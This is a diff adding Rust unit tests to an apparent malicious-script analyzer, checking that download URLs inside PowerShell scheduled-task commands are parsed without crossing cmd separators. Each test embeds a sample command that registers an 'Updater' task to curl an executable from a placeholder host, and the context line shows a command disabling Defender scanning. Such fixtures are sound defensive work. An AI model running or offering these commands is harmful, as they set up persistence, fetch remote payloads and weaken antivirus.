@@ -30288,6 +30288,118 @@ powershell -Command "Set-MpPreference -DisableArchiveScanning $true -DisableEmai
     }
 
     #[test]
+    fn powershell_scheduled_task_delayed_url_does_not_cross_cmd_separator() {
+        let script = br#"powershell -Command "$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/V:ON /c set U=https://ps-task.example/p.exe&&curl -o out.exe !U!'; Register-ScheduledTask -TaskName Updater -Action $a -Force"
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src.contains("&&curl")
+            )),
+            "PowerShell scheduled-task URL crossed command separator: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://ps-task.example/p.exe"
+            )),
+            "PowerShell scheduled-task clean URL missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_scheduled_task_delayed_url_does_not_cross_or_separator() {
+        let script = br#"powershell -Command "$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c set U=https://ps-task-or.example/p.exe||curl -o out.exe !U!'; Register-ScheduledTask -TaskName Updater -Action $a -Force"
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src.contains("||curl")
+            )),
+            "PowerShell scheduled-task URL crossed OR command separator: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://ps-task-or.example/p.exe"
+            )),
+            "PowerShell scheduled-task clean OR-separator URL missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_scheduled_task_delayed_url_does_not_cross_pipe_separator() {
+        let script = br#"powershell -Command "$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c set U=https://ps-task-pipe.example/p.exe|curl -o out.exe !U!'; Register-ScheduledTask -TaskName Updater -Action $a -Force"
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src.contains("|curl")
+            )),
+            "PowerShell scheduled-task URL crossed pipe command separator: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://ps-task-pipe.example/p.exe"
+            )),
+            "PowerShell scheduled-task clean pipe-separator URL missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_scheduled_task_delayed_url_does_not_cross_single_amp_separator() {
+        let script = br#"powershell -Command "$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c set U=https://ps-task-amp.example/p.exe&curl -o out.exe !U!'; Register-ScheduledTask -TaskName Updater -Action $a -Force"
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src.contains("&curl")
+            )),
+            "PowerShell scheduled-task URL crossed single ampersand command separator: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://ps-task-amp.example/p.exe"
+            )),
+            "PowerShell scheduled-task clean ampersand-separator URL missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_scheduled_task_delayed_url_preserves_query_ampersands() {
+        let script = br#"powershell -Command "$a = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c set U=https://ps-task-query.example/p.exe?a=1&b=2&&curl -o out.exe !U!'; Register-ScheduledTask -TaskName Updater -Action $a -Force"
+"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://ps-task-query.example/p.exe?a=1&b=2"
+            )),
+            "PowerShell scheduled-task query ampersand URL was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn copied_mshta_alias_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         env.traits.push(Trait::WindowsUtilManip {
